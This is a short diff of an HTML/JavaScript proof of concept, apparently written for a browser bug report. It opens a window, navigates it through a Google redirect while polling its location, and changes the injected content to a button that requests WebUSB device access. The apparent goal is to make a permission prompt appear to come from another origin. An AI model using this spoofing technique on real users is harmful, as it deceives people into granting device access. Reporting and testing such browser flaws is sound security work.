@@ -1,4 +1,6 @@
 
+
+
 <script>
   function next() {
          w.location.replace('https://www.google.com/csi');
@@ -6,7 +8,7 @@
 
   function f() {
     w = window.open("");
-    w.document.write('<h2>This is not twitter.com!</h2>');
+    w.document.write("<input onclick='navigator.usb.requestDevice({filters: [{}]}).then(setTimeout(function(){}, 300));' />");
     w.location = "https://www.google.com/url?rct=j&sa=t&url=https://lbr.rand.org/content/dam/rand/pubs/reports/2006/R3113.1.pdf&ct=ga&cd=CAEYACoTNjIzMDg5NjczNDA0NDY0MDUxNTIaYWFjZGMzYjNiN2JlY2JiYzpjb206ZW46VVM&usg=AFQjCNHKAomHqBOlSAw9tTxJx8YIF2lmxA";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
